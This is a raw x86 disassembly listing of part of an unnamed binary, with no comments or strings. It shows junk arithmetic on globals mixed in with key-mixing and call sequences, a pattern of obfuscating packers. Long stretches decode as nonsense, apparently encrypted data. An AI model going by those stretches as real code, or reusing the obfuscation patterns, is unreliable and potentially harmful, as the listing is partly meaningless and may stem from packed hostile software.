  413723:	mov    ecx,DWORD PTR ds:0x4283ad
  413729:	mov    ecx,DWORD PTR [ecx]
  41372b:	add    DWORD PTR ds:0x42836d,ecx
  413731:	or     ecx,ecx
  413733:	sbb    DWORD PTR ds:0x4284ed,0x6873
  41373d:	sbb    DWORD PTR ds:0x4284f5,ecx
  413743:	adc    DWORD PTR ds:0x428471,0x1149
  41374d:	or     DWORD PTR ds:0x4284f1,edx
  413753:	mov    eax,DWORD PTR [ebp-0x28]
  413756:	cmp    DWORD PTR ds:0x428455,0x0
  41375d:	mov    ecx,0xa9f
  413762:	mov    DWORD PTR ds:0x42841d,0x1875
  41376c:	mov    DWORD PTR ds:0x4284f1,0x319d
  413776:	jmp    0x41383a
  41377b:	mov    DWORD PTR ds:0x4284e1,0x86c
  413785:	cmp    DWORD PTR ds:0x428455,0x0
  41378c:	jle    0x4137bf
  413792:	push   0x50b5
  413797:	call   DWORD PTR ds:0x42e25c
  41379d:	add    DWORD PTR ds:0x428365,0x737d
  4137a7:	sub    ecx,DWORD PTR ds:0x4284f1
  4137ad:	mov    ecx,DWORD PTR ds:0x428565
  4137b3:	xor    ecx,DWORD PTR ds:0x428431
  4137b9:	mov    DWORD PTR ds:0x428565,ecx
  4137bf:	inc    ecx
  4137c0:	movzx  ecx,BYTE PTR ds:0x428365
  4137c7:	sub    ecx,DWORD PTR ds:0x4284d1
  4137cd:	mov    DWORD PTR ds:0x428365,ecx
  4137d3:	cmp    DWORD PTR ds:0x42844d,0x0
  4137da:	not    ecx
  4137dc:	mov    DWORD PTR ds:0x42840d,0x5561
  4137e6:	jmp    0x41383a
  4137eb:	mov    DWORD PTR ds:0x428581,0x2772
  4137f5:	cmp    DWORD PTR ds:0x42844d,0x0
  4137fc:	jle    0x41381e
  413802:	push   0x5196
  413807:	push   0x42820f
  41380c:	call   DWORD PTR ds:0x42e260
  413812:	sbb    DWORD PTR ds:0x428369,ecx
  413818:	xor    ecx,DWORD PTR ds:0x42857d
  41381e:	and    DWORD PTR ds:0x42843d,edi
  413824:	inc    DWORD PTR ds:0x428451
  41382a:	add    DWORD PTR ds:0x428359,0x3293
  413834:	or     DWORD PTR ds:0x428425,ecx
  41383a:	mov    DWORD PTR [ebp-0x24],eax
  41383d:	mov    ecx,DWORD PTR [ebp-0x24]
  413840:	push   0x4
  413842:	sub    DWORD PTR ds:0x4284dd,0x4aeb
  41384c:	pop    eax
  41384d:	sbb    DWORD PTR ds:0x42855d,0x428359
  413857:	sub    eax,ecx
  413859:	cmp    DWORD PTR ds:0x428371,0x0
  413860:	mov    ecx,DWORD PTR ds:0x4284f1
  413866:	not    ecx
  413868:	movzx  ecx,BYTE PTR ds:0x428349
  41386f:	mov    ecx,DWORD PTR ds:0x428465
  413875:	jmp    0x4138c3
  41387a:	mov    DWORD PTR ds:0x4284e1,0x61cd
  413884:	cmp    DWORD PTR ds:0x428371,0x0
  41388b:	je     0x4138b5
  413891:	push   0x4284e5
  413896:	push   0x4282df
  41389b:	call   DWORD PTR ds:0x42e264
  4138a1:	or     DWORD PTR ds:0x428461,0x428425
  4138ab:	mov    DWORD PTR ds:0x428421,0x2055
  4138b5:	sub    ecx,DWORD PTR ds:0x42845d
  4138bb:	or     ecx,DWORD PTR ds:0x42840d
  4138c1:	neg    ecx
  4138c3:	mov    ecx,DWORD PTR [ebp-0x20]
  4138c6:	add    ecx,eax
  4138c8:	mov    DWORD PTR [ebp-0x30],ecx
  4138cb:	lea    eax,[ebp-0x3c]
  4138ce:	mov    DWORD PTR [ebp-0x38],eax
  4138d1:	mov    eax,DWORD PTR [ebp-0x18]
  4138d4:	mov    ecx,DWORD PTR [ebp-0x18]
  4138d7:	xor    eax,edi
  4138d9:	xor    ecx,ebx
  4138db:	shr    eax,0x2
  4138de:	shl    ecx,0x1e
  4138e1:	or     eax,ecx
  4138e3:	mov    DWORD PTR [ebp-0x2c],eax
  4138e6:	mov    DWORD PTR [ebp-0x8],0xa5069bbe
  4138ed:	mov    eax,DWORD PTR [ebp-0x8]
  4138f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4138f3:	xor    eax,edi
  4138f5:	xor    ecx,ebx
  4138f7:	shr    eax,0x2
  4138fa:	shl    ecx,0x1e
  4138fd:	or     ecx,eax
  4138ff:	push   ecx
  413900:	lea    eax,[ebp-0x8]
  413903:	push   eax
  413904:	lea    eax,[ebp-0x80]
  413907:	push   eax
  413908:	call   0x411c08
  41390d:	mov    eax,DWORD PTR [ebp-0x8]
  413910:	mov    ecx,DWORD PTR [ebp-0x8]
  413913:	xor    eax,edi
  413915:	xor    ecx,ebx
  413917:	shr    eax,0x2
  41391a:	shl    ecx,0x1e
  41391d:	or     ecx,eax
  41391f:	push   ecx
  413920:	lea    eax,[ebp-0x24]
  413923:	push   eax
  413924:	mov    eax,DWORD PTR [ebp+0x8]
  413927:	mov    ecx,DWORD PTR [ebp+0xc]
  41392a:	shrd   eax,ecx,0x2
  41392e:	shr    ecx,0x2
  413931:	mov    ecx,DWORD PTR [ebp+0x8]
  413934:	mov    edx,DWORD PTR [ebp+0xc]
  413937:	xor    eax,esi
  413939:	xor    edx,edx
  41393b:	or     eax,edx
  41393d:	lea    eax,[ebp+eax*4-0x7c]
  413941:	push   eax
  413942:	shl    ecx,0x1e
  413945:	call   0x411c08
  41394a:	mov    eax,DWORD PTR [ebp-0x8]
  41394d:	mov    ecx,DWORD PTR [ebp-0x8]
  413950:	xor    eax,edi
  413952:	xor    ecx,ebx
  413954:	shr    eax,0x2
  413957:	shl    ecx,0x1e
  41395a:	or     ecx,eax
  41395c:	push   ecx
  41395d:	lea    eax,[ebp-0x30]
  413960:	push   eax
  413961:	jmp    0x413c9a
  413966:	in     eax,dx
  413967:	dec    edi
  413968:	ret    
  413969:	in     al,dx
  41396a:	fs jl  0x413963
  41396d:	pop    ebx
  41396e:	push   0xeee3e744
  413973:	cmc    
  413974:	scas   al,BYTE PTR es:[edi]
  413975:	iret   
  413976:	in     al,dx
  413977:	xchg   BYTE PTR [esi-0x413b1242],bh
  41397d:	mov    esi,0xc18a9856
  413982:	inc    esi
  413983:	fbstp  TBYTE PTR ds:0xc9de0f6d
  413989:	jns    0x4139ee
  41398b:	into   
  41398c:	in     al,0x7a
  41398e:	xchg   ebp,eax
  41398f:	xor    DWORD PTR [esi],esi
  413991:	jb     0x4139b3
  413993:	shl    BYTE PTR [edx+esi*2],0x46
  413997:	out    dx,al
  413998:	adc    ebp,ecx
  41399a:	xor    BYTE PTR [esi+0x21],bh
  41399d:	pop    edi
  41399e:	repz mov bl,0x3c
  4139a1:	and    al,0x2e
  4139a3:	push   ebp
  4139a4:	dec    ebx
  4139a5:	push   ebp
  4139a6:	sbb    DWORD PTR [edi-0x2],ecx
  4139a9:	ret    0x1798
  4139ac:	dec    esi
  4139ad:	and    ch,BYTE PTR [edi+0x164d6dbd]
  4139b3:	loope  0x413a0f
  4139b5:	jne    0x41397e
  4139b7:	clc    
  4139b8:	je     0x4139b7
  4139ba:	mov    edi,0x77633ca0
  4139bf:	cmp    al,0xde
  4139c1:	adc    esp,DWORD PTR [edx-0x27b2e6f8]
  4139c7:	inc    ebx
  4139c8:	dec    ecx
  4139c9:	dec    edx
  4139ca:	test   ah,cl
  4139cc:	dec    eax
  4139cd:	adc    eax,0xdf19bbbf
  4139d2:	into   
  4139d3:	rcr    ebp,0xa8
  4139d6:	jmp    0xa070:0xcbe88006
  4139dd:	add    DWORD PTR [eax+0x79bfc87e],0x44f57968
  4139e7:	xchg   edx,eax
  4139e8:	xor    DWORD PTR [edi+0x205720f4],ecx
  4139ee:	add    ch,BYTE PTR [eax+0x6]
  4139f1:	(bad)  
  4139f2:	sbb    eax,0x7131efda
  4139f7:	inc    ebx
  4139f8:	sub    esi,ebp
  4139fa:	ins    BYTE PTR es:[edi],dx
  4139fb:	call   0xbe4b:0xed1e76ca
  413a02:	or     ah,BYTE PTR [edx-0x4ba54f4d]
  413a08:	mov    bh,0x11
  413a0a:	lods   al,BYTE PTR ds:[esi]
  413a0b:	mov    edi,eax
  413a0d:	clc    
  413a0e:	sbb    dl,al
  413a10:	mov    dl,0x50
  413a12:	mov    ecx,0x3ffe265f
  413a17:	sbb    al,0x7e
  413a19:	imul   edx,DWORD PTR [edi+ecx*4],0x19ed6fc
  413a20:	push   edi
  413a21:	jbe    0x413a44
  413a23:	pushf  
  413a24:	pop    eax
  413a25:	iret   
  413a26:	xchg   DWORD PTR [ebp+0x5],eax
  413a29:	adc    BYTE PTR [ebp+0x11],al
  413a2c:	cmp    ch,dl
  413a2e:	mov    eax,ds:0x14cb2e86
  413a33:	gs test eax,ebp
  413a36:	lods   eax,DWORD PTR ds:[esi]
  413a37:	sub    DWORD PTR [eax],esp
  413a39:	pop    eax
  413a3a:	out    dx,eax
  413a3b:	cmp    esi,edx
  413a3d:	mov    ds:0xf82a0b88,eax
  413a42:	in     al,dx
  413a43:	jp     0x413a4f
  413a45:	ins    BYTE PTR es:[edi],dx
  413a46:	xor    eax,0xe2d75ccd
  413a4b:	xlat   BYTE PTR ds:[ebx]
  413a4c:	repnz mov bl,0xb
  413a4f:	hlt    
  413a50:	mov    bh,0x66
  413a53:	adc    edi,DWORD PTR ds:0xb456b423
  413a59:	add    ebx,DWORD PTR [edx+0x29]
  413a5c:	push   0x73
  413a5e:	xor    eax,0x112a1091
  413a63:	dec    edx
  413a64:	adc    al,0x35
  413a66:	sbb    dl,BYTE PTR [ecx-0x29d0602d]
  413a6c:	adc    bh,ah
  413a6e:	jb     0x413a56
  413a70:	ins    BYTE PTR es:[edi],dx
  413a71:	sti    
  413a72:	inc    esp
  413a73:	jo     0x413a99
  413a75:	mov    ch,0x87
  413a77:	xchg   BYTE PTR [ecx-0x7c],dl
  413a7a:	bswap  ebp
  413a7c:	stos   BYTE PTR es:[edi],al
  413a7d:	scas   eax,DWORD PTR es:[edi]
  413a7e:	mov    dh,0x97
  413a80:	or     eax,DWORD PTR [edi-0x4a]
  413a83:	jmp    0xca76fe7e
  413a88:	retf   
  413a89:	or     bl,ah
  413a8b:	pop    eax
  413a8c:	cmpxchg DWORD PTR [eax],ebp
  413a8f:	mov    ah,0xc4
  413a91:	inc    eax
  413a92:	and    DWORD PTR [edx],eax
  413a94:	fwait
  413a95:	prefetchwt1 BYTE PTR [eax-0x21]
  413a99:	push   ss
  413a9a:	loopne 0x413a45
  413a9c:	js     0x413b0c
  413a9e:	xchg   ebp,eax
  413a9f:	push   es
  413aa0:	sbb    bh,bh
  413aa2:	dec    ecx
  413aa3:	mov    ebx,0xd221e72b
  413aa8:	sbb    eax,0x77da53d3
  413aad:	arpl   WORD PTR [eax+eax*8+0xae277ea],cx
  413ab4:	ins    DWORD PTR es:[edi],dx
  413ab5:	adc    bl,dl
  413ab7:	cmc    
  413ab8:	push   esp
  413ab9:	hlt    
  413aba:	adc    ch,BYTE PTR [ecx-0x4b]
  413abd:	pop    edx
  413abe:	xchg   BYTE PTR [edx-0x15],dh
  413ac1:	es pusha 
  413ac3:	sub    DWORD PTR [edi-0x11],esi
  413ac6:	inc    esi
  413ac7:	int    0xfc
  413ac9:	push   ecx
  413aca:	xor    eax,0x12faded7
  413acf:	mov    ecx,DWORD PTR [edi+0xe]
  413ad2:	push   ebp
  413ad3:	push   edi
  413ad4:	call   0x2a866dda
  413ad9:	cmp    eax,0x596b6dea
  413ade:	ja     0x413a76
  413ae0:	cmp    edx,esi
  413ae2:	cmp    BYTE PTR [edi],ch
  413ae4:	test   eax,0x4b7ae4a9
  413ae9:	mov    eax,0x36c09f3e
  413aee:	dec    ebx
  413aef:	je     0x413b11
  413af1:	inc    eax
  413af2:	test   eax,0x6ce1fcbb
  413af7:	mov    bh,0x6e
  413af9:	mov    ds:0xc4c7dfb4,al
  413afe:	shrd   esi,edx,cl
  413b01:	imul   esp,esp,0xd0403738
  413b07:	add    eax,0xf760c7c3
  413b0c:	sub    BYTE PTR [ebx],dh
  413b0e:	sahf   
  413b0f:	or     bl,dh
  413b11:	shl    bh,cl
  413b13:	pop    ebx
  413b14:	ja     0x413acb
  413b16:	(bad)  
  413b18:	xor    cl,ch
  413b1a:	js     0x413a9f
  413b1c:	push   0x2eccbbd7
  413b21:	pop    esp
  413b22:	fstp   QWORD PTR [esi]
  413b24:	jae    0x413ad1
  413b26:	stos   BYTE PTR es:[edi],al
  413b27:	jmp    0x1839:0xffb7a41a
  413b2e:	xor    al,0x30
  413b30:	cmp    DWORD PTR [eax],eax
  413b32:	fidiv  DWORD PTR [ebp+0x21]
  413b35:	xor    eax,0x13d96649
  413b3a:	pop    esi
  413b3b:	jnp    0x413aed
  413b3d:	fs lock xchg ebx,eax
  413b40:	test   al,0xae
  413b42:	or     eax,0xfec61c7c
  413b47:	sbb    esp,esi
  413b49:	cs jmp 0x8655dbdf
  413b4f:	stos   BYTE PTR es:[edi],al
  413b50:	ins    BYTE PTR es:[edi],dx
  413b51:	mov    dh,0x46
  413b53:	scas   al,BYTE PTR es:[edi]
  413b54:	fstp   QWORD PTR [eax-0x6f]
  413b57:	into   
  413b58:	scas   al,BYTE PTR es:[edi]
  413b59:	call   0x9a73:0xf1b5f211
  413b60:	jge    0x413b5c
  413b62:	shl    bh,1
  413b64:	rol    BYTE PTR [ebx-0xe],1
  413b67:	mov    ebp,0xee1485a8
  413b6c:	cmp    BYTE PTR [eax+0x79],cl
  413b6f:	add    BYTE PTR [edx-0x40a69db1],al
  413b75:	xor    eax,DWORD PTR [ebx+0x4e657832]
  413b7b:	add    dl,BYTE PTR [ebx]
  413b7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b7e:	fmul   st(2),st
  413b80:	push   edi
  413b81:	mov    DWORD PTR [edi-0x70],esp
  413b84:	jne    0x413b49
  413b86:	cmp    DWORD PTR [ebp+0x1b20bdab],0x68871c0e
  413b90:	cdq    
  413b91:	mov    esi,0x553058ec
  413b96:	inc    ecx
  413b97:	jle    0x413ba6
  413b99:	(bad)  
  413b9a:	cmp    ch,BYTE PTR ds:0x97576802
  413ba0:	(bad)  
  413ba1:	daa    
  413ba2:	cmc    
  413ba3:	cld    
  413ba4:	jbe    0x413b29
  413ba6:	mov    cl,0x32
  413ba8:	mov    ecx,0x5b6095f6
  413bad:	scas   al,BYTE PTR es:[edi]
  413bae:	ficom  DWORD PTR [eax-0x34]
  413bb1:	outs   dx,DWORD PTR ds:[esi]
  413bb2:	add    BYTE PTR [ecx+eiz*4-0x53],bl
  413bb6:	(bad)  
  413bb7:	and    eax,0x9ee11a45
  413bbc:	jmp    0x76e4f829
  413bc1:	popf   
  413bc2:	pop    ebp
  413bc3:	iret   
  413bc4:	push   es
  413bc5:	mov    DWORD PTR [edx],ecx
  413bc7:	fwait
  413bc8:	dec    eax
  413bc9:	pop    ecx
  413bca:	fsub   st,st(0)
  413bcc:	retf   0x52b7
  413bcf:	and    eax,0x9aa0b4d7
  413bd4:	sub    eax,ecx
  413bd6:	and    ah,BYTE PTR [esi+esi*8+0x64]
  413bda:	addr16 pop ebx
  413bdc:	fs sub edi,ecx
  413bdf:	mov    edi,0xda7d46bb
  413be4:	ds inc edx
  413be6:	int3   
  413be7:	push   es
  413be8:	mov    al,ds:0xc8e209a8
  413bed:	retf   
  413bee:	xchg   ebx,eax
  413bef:	jbe    0x413c6e
  413bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bf2:	push   ecx
  413bf3:	xor    eax,0x684c3879
  413bf8:	out    0x53,al
  413bfa:	adc    al,0x1
  413bfc:	(bad)  
  413bfd:	jecxz  0x413bf2
  413bff:	push   ebx
  413c00:	mov    BYTE PTR [esp+eiz*4],dl
  413c03:	dec    edx
  413c04:	imul   esp,DWORD PTR [edi],0x9ffc007
  413c0a:	ins    DWORD PTR es:[edi],dx
  413c0b:	outs   dx,DWORD PTR ds:[esi]
  413c0c:	jnp    0x413c7e
  413c0e:	sub    ch,0x97
  413c11:	sub    dh,dl
  413c13:	sub    DWORD PTR [edx-0x55],ebx
  413c16:	sub    ecx,DWORD PTR [ebp-0x6e0ee609]
  413c1c:	dec    edi
  413c1d:	sbb    edi,DWORD PTR [edx+0x42bb957b]
  413c23:	in     al,dx
  413c24:	out    dx,eax
  413c25:	pop    eax
  413c26:	add    DWORD PTR [ebx+0x124325f5],0x63
  413c2d:	fstp   DWORD PTR [edx-0x4c]
  413c30:	arpl   bp,ax
  413c32:	push   ebp
  413c33:	ds jmp 0x6dbf48ab
  413c39:	fstp   QWORD PTR [esi+esi*1+0x46d4bcb]
  413c40:	or     BYTE PTR [eax+0x8],bh
  413c43:	fldenv ds:0x750a49fd
  413c49:	push   0xef5016be
  413c4e:	inc    ebp
  413c4f:	mov    al,ds:0x79a5dde6
  413c54:	jmp    0x413c4b
  413c56:	pop    ecx
  413c57:	jne    0x413c76
  413c59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c5a:	xchg   ebp,eax
  413c5b:	and    eax,0x99764f2
  413c60:	sbb    BYTE PTR [esi],cl
  413c62:	(bad)  
  413c63:	retf   0x936b
  413c66:	cld    
  413c67:	sub    eax,0x18e944ff
  413c6c:	push   es
  413c6d:	lock cld 
  413c6f:	jle    0x413ce4
  413c71:	jo     0x413c47
  413c73:	js     0x413cdc
  413c75:	xchg   edx,eax
  413c76:	jo     0x413cc6
  413c78:	pop    es
  413c79:	xor    eax,0x19324cd
  413c7e:	test   BYTE PTR [esi-0x1099df6a],ah
  413c84:	out    0xdd,al
  413c86:	arpl   sp,sp
  413c88:	ja     0x413c8a
  413c8a:	xor    BYTE PTR [ebp+0x3b],cl
  413c8d:	inc    eax
  413c8e:	add    ecx,edx
  413c90:	nop
  413c91:	aaa    
  413c92:	and    eax,eax
  413c94:	and    al,0xa6
  413c96:	and    BYTE PTR [edx],ah
  413c98:	lahf   
  413c99:	ror    DWORD PTR [ebx+0x4d8b1045],1
  413c9f:	adc    al,0xf
  413ca1:	lods   al,BYTE PTR ds:[esi]
  413ca2:	enter  0xc102,0xe9
  413ca6:	add    cl,BYTE PTR [ebx+0x558b104d]
  413cac:	adc    al,0x33
  413cae:	(bad)  
  413caf:	xor    edx,edx
  413cb1:	or     eax,edx
  413cb3:	lea    eax,[ebp+eax*4-0x7c]
  413cb7:	push   eax
  413cb8:	shl    ecx,0x1e
  413cbb:	call   0x411c08
  413cc0:	mov    eax,DWORD PTR [ebp-0x8]
  413cc3:	mov    ecx,DWORD PTR [ebp-0x8]
  413cc6:	xor    ecx,ebx
  413cc8:	xor    eax,edi
  413cca:	shl    ecx,0x1e
  413ccd:	shr    eax,0x2
  413cd0:	or     ecx,eax
  413cd2:	push   ecx
  413cd3:	lea    eax,[ebp-0x2c]
  413cd6:	push   eax
  413cd7:	mov    eax,DWORD PTR [ebp+0x10]
  413cda:	mov    ecx,DWORD PTR [ebp+0x14]
  413cdd:	shrd   eax,ecx,0x2
  413ce1:	shr    ecx,0x2
  413ce4:	mov    ecx,DWORD PTR [ebp+0x10]
  413ce7:	mov    edx,DWORD PTR [ebp+0x14]
  413cea:	xor    edx,edx
  413cec:	xor    eax,esi
  413cee:	or     eax,edx
  413cf0:	shl    ecx,0x1e
  413cf3:	mov    ecx,DWORD PTR [ebp+0x10]
  413cf6:	mov    edx,DWORD PTR [ebp+0x14]
  413cf9:	shrd   ecx,edx,0x2
  413cfd:	shr    edx,0x2
  413d00:	mov    edx,DWORD PTR [ebp+0x10]
  413d03:	mov    ebx,DWORD PTR [ebp+0x14]
  413d06:	xor    ecx,esi
  413d08:	xor    ebx,ebx
  413d0a:	or     ecx,ebx
  413d0c:	add    eax,ecx
  413d0e:	lea    eax,[ebp+eax*4-0x7c]
  413d12:	push   eax
  413d13:	shl    edx,0x1e
  413d16:	call   0x411c08
  413d1b:	mov    eax,DWORD PTR [ebp-0x8]
  413d1e:	mov    ecx,DWORD PTR [ebp-0x8]
  413d21:	xor    ecx,0xfffffffe
  413d24:	shl    ecx,0x1e
  413d27:	xor    eax,edi
  413d29:	shr    eax,0x2
  413d2c:	or     ecx,eax
  413d2e:	push   ecx
  413d2f:	lea    eax,[ebp-0x38]
  413d32:	push   eax
  413d33:	mov    eax,DWORD PTR [ebp+0x10]
  413d36:	mov    ecx,DWORD PTR [ebp+0x14]
  413d39:	shrd   eax,ecx,0x2
  413d3d:	shr    ecx,0x2
  413d40:	jmp    0x414079
  413d45:	lock aad 0x95
  413d48:	dec    ecx
  413d49:	mov    bh,0x8a
  413d4b:	xor    al,0x7c
  413d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d4e:	cmp    eax,0xfe4ddd72
  413d53:	inc    esi
  413d54:	xchg   edx,eax
  413d55:	sbb    ecx,DWORD PTR [esi+edi*4-0x413b1242]
  413d5c:	mov    esi,0xdae6f9d7
  413d61:	ret    0xe76a
  413d64:	cwde   
  413d65:	jecxz  0x413d48
  413d67:	std    
  413d68:	je     0x413d9f
  413d6a:	inc    eax
  413d6b:	je     0x413d8e
  413d6d:	loope  0x413d0e
  413d6f:	int3   
  413d70:	jl     0x413d0d
  413d72:	jmp    0x5dc3:0xc7c238ca
  413d79:	jns    0x413da4
  413d7b:	ins    DWORD PTR es:[edi],dx
  413d7c:	or     ah,dh
  413d7e:	mov    ebp,0x86f83afc
  413d83:	mov    DWORD PTR [esi+0x33],ebx
  413d86:	push   cs
  413d87:	loope  0x413d22
  413d89:	inc    ebp
  413d8a:	retf   0x2c52
  413d8d:	xor    edx,ebp
  413d8f:	stos   BYTE PTR es:[edi],al
  413d90:	les    edi,FWORD PTR [esi-0x77beada8]
  413d96:	jno    0x413dce
  413d98:	cmp    DWORD PTR [edx+esi*2],eax
  413d9b:	test   DWORD PTR [edi-0x77],0x93f670ed
  413da2:	jae    0x413de6
  413da4:	call   0x74ba5a0f
  413da9:	inc    ecx
  413daa:	inc    edx
  413dab:	sbb    al,0xb8
  413dad:	mov    eax,ds:0x8f3debf
  413db2:	out    dx,al
  413db3:	cmp    al,0xc9
  413db5:	xor    eax,0x8db95aab
  413dba:	push   cs
  413dbb:	mov    dl,0xf3
  413dbd:	jmp    0x413d64
  413dbf:	sbb    al,0x5d
  413dc1:	lods   al,BYTE PTR ss:[esi]
  413dc3:	dec    edi
  413dc4:	ins    DWORD PTR es:[edi],dx
  413dc5:	mov    bh,BYTE PTR [eax+0x7e5a6ab0]
  413dcb:	test   eax,0x8d17b827
  413dd0:	test   BYTE PTR [edx],ch
  413dd2:	(bad)  
  413dd3:	push   ebx
  413dd4:	scas   al,BYTE PTR es:[edi]
  413dd5:	retf   
  413dd6:	inc    ebx
  413dd7:	pop    ds
  413dd8:	pop    ss
  413dd9:	daa    
  413dda:	stos   DWORD PTR es:[edi],eax
  413ddb:	mov    WORD PTR [ebx],?
  413ddd:	pushf  
  413dde:	adc    esi,DWORD PTR [edx+0x2]
  413de1:	dec    ebp
  413de2:	jo     0x413e5e
  413de4:	lods   al,BYTE PTR ds:[esi]
  413de5:	cs xor ebx,ebx
  413de8:	jmp    0x2d:0x8e25384f
  413def:	mov    dh,0x35
  413df1:	xchg   dl,dl
  413df3:	jne    0x413e14
  413df5:	retf   
  413df6:	pop    ebp
  413df7:	hlt    
  413df8:	stos   DWORD PTR es:[edi],eax
  413df9:	push   es
  413dfa:	(bad)  
  413dfb:	sar    DWORD PTR [ebp-0x1f],1
  413dfe:	xlat   BYTE PTR ds:[ebx]
  413dff:	mov    eax,ds:0x43320b25
  413e04:	xor    al,0x58
  413e06:	dec    edi
  413e07:	adc    DWORD PTR [edi],esp
  413e09:	and    al,0x96
  413e0b:	js     0x413dcf
  413e0d:	push   ebx
  413e0e:	in     al,dx
  413e0f:	repnz aas 
  413e11:	xlat   BYTE PTR ds:[ebx]
  413e12:	cmp    al,0x21
  413e14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e15:	or     al,0xbd
  413e17:	mov    BYTE PTR [ebx-0x834691b],ch
  413e1d:	ins    DWORD PTR es:[edi],dx
  413e1e:	pop    esi
  413e1f:	inc    ecx
  413e20:	scas   eax,DWORD PTR es:[edi]
  413e21:	ja     0x413e71
  413e23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e24:	cmc    
  413e25:	dec    edi
  413e26:	ficom  WORD PTR [eax]
  413e28:	push   ss
  413e29:	dec    edi
  413e2a:	cmp    al,0xfd
  413e2c:	ror    DWORD PTR [edi],1
  413e2e:	mov    eax,ds:0xe8a5c7c5
  413e33:	mov    WORD PTR [edx+0x7a],fs
  413e36:	cli    
  413e37:	push   eax
  413e38:	and    al,0x9a
  413e3a:	sub    eax,0x1b375862
  413e3f:	sbb    DWORD PTR [edx],ebx
  413e41:	fiadd  WORD PTR [ebx+0x43]
  413e44:	and    DWORD PTR [ecx+0x38],0x8d39aaaf
  413e4b:	inc    ebx
  413e4c:	adc    al,0x7e
  413e4e:	stos   DWORD PTR es:[edi],eax
  413e4f:	inc    esp
  413e50:	add    eax,0xab2bddf3
  413e55:	jmp    0x413e50
  413e57:	mov    bh,0xeb
  413e59:	mov    bh,ch
  413e5b:	jle    0x413e4c
  413e5d:	dec    eax
  413e5e:	push   esp
  413e5f:	or     eax,0x6c3a001e
  413e64:	jecxz  0x413e09
  413e66:	loopne 0x413ee7
  413e68:	xchg   BYTE PTR [ebx-0x5211b618],cl
  413e6e:	inc    ecx
  413e6f:	ret    0x12bf
  413e72:	pusha  
  413e73:	dec    ebp
  413e74:	jp     0x413eaa
  413e76:	out    0xad,eax
  413e78:	xchg   DWORD PTR [ebx],ebx
  413e7a:	pop    ecx
  413e7b:	shr    BYTE PTR [ebx+0x0],1
  413e7e:	adc    al,0x3
  413e80:	fwait
  413e81:	jb     0x413e8a
  413e83:	stos   DWORD PTR es:[edi],eax
  413e84:	inc    ebx
  413e85:	xor    al,0xb5
  413e87:	dec    esp
  413e88:	stos   BYTE PTR es:[edi],al
  413e89:	dec    esp
  413e8a:	in     eax,0x14
  413e8c:	xor    eax,0xb295c740
  413e91:	mov    eax,0x8b7d7614
  413e96:	sub    BYTE PTR [esi],dl
  413e98:	sub    esi,eax
  413e9a:	sbb    BYTE PTR [edx-0x3e],dh
  413e9d:	pop    esp
  413e9e:	cld    
  413e9f:	and    al,cl
  413ea1:	jle    0x413e7e
  413ea3:	add    dl,BYTE PTR [ebx+0x4efcd232]
  413ea9:	push   edi
  413eaa:	mov    eax,ds:0x1ccf883f
  413eaf:	pop    esi
  413eb0:	out    0x5c,al
  413eb2:	gs pushf 
  413eb4:	int3   
  413eb5:	sbb    al,0xaf
  413eb7:	pop    ebp
  413eb8:	lods   al,BYTE PTR ds:[esi]
  413eb9:	jl     0x413f2a
  413ebb:	dec    edi
  413ebc:	xor    BYTE PTR [ecx-0x1d46e0b],bl
  413ec2:	mov    bl,0x74
  413ec4:	out    0xc3,eax
  413ec6:	scas   eax,DWORD PTR es:[edi]
  413ec7:	popa   
  413ec8:	(bad)  
  413ec9:	mov    edx,0xd3069991
  413ece:	jae    0x413f0b
  413ed0:	pop    esi
  413ed1:	shr    DWORD PTR [ecx+0x7962278],1
  413ed7:	cmp    DWORD PTR [esi-0x23a0a637],ebx
  413edd:	dec    edi
  413ede:	sbb    esi,eax
  413ee0:	pusha  
  413ee1:	std    
  413ee2:	nop
  413ee3:	in     eax,0x2d
  413ee5:	inc    edx
  413ee6:	lods   al,BYTE PTR ds:[esi]
  413ee7:	push   0x91d7fbd0
  413eec:	sbb    cl,ch
  413eee:	std    
  413eef:	call   0x237cd89c
  413ef4:	gs mov bl,0xc2
  413ef7:	xlat   BYTE PTR ds:[ebx]
  413ef8:	ficomp WORD PTR [ebx]
  413efa:	pop    ss
  413efb:	jo     0x413ebc
  413efd:	leave  
  413efe:	fdivr  QWORD PTR [edx+ecx*8+0x73]
  413f02:	push   esp
  413f03:	inc    ebx
  413f04:	push   eax
  413f05:	(bad)  
  413f06:	lock sbb dl,bl
  413f09:	adc    esi,DWORD PTR [edi+0x51dff033]
  413f0f:	mov    edi,0x80c02a2
  413f14:	jno    0x413f3e
  413f16:	add    edi,ebp
  413f18:	pop    ds
  413f19:	scas   eax,DWORD PTR es:[edi]
  413f1a:	cli    
  413f1b:	or     al,0xa5
  413f1d:	gs test al,0x4a
  413f20:	mov    ss,WORD PTR [edi-0x43]
  413f23:	int3   
  413f24:	pop    esi
  413f25:	ins    DWORD PTR es:[edi],dx
  413f26:	mov    BYTE PTR [ebx],bl
  413f28:	adc    edx,ebp
  413f2a:	jmp    0x24f5111
  413f2f:	push   0xbc0973ed
  413f34:	cmp    al,0xb5
  413f36:	mov    ebx,0xa8d0fa59
  413f3b:	xor    eax,0xcd472b0f
  413f40:	inc    edx
  413f41:	cmp    edx,eax
  413f43:	jmp    0x413f1c
  413f45:	je     0x413eff
  413f47:	xor    al,0x25
  413f49:	jo     0x413fab
  413f4b:	les    edx,FWORD PTR ds:0xd160fbca
  413f51:	xchg   edx,eax
  413f52:	pop    ecx
  413f53:	loopne 0x413f1b
  413f55:	repz or esi,DWORD PTR [esi+0xfc2e614]
  413f5c:	dec    ecx
  413f5d:	mov    dl,0xd7
  413f5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f60:	jbe    0x413f04
  413f62:	and    dh,BYTE PTR [edi-0x22]
  413f65:	add    DWORD PTR [eax-0x50],ebx
  413f68:	xchg   esp,eax
  413f69:	pop    edx
  413f6a:	in     al,0x6b
  413f6c:	les    eax,FWORD PTR [esi-0x1e]
  413f6f:	repz repnz (bad) 
  413f72:	fldenv [ecx-0x4fe2d62c]
  413f78:	ss xchg ebx,eax
  413f7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f7b:	mov    BYTE PTR [eax-0x10],0xeb
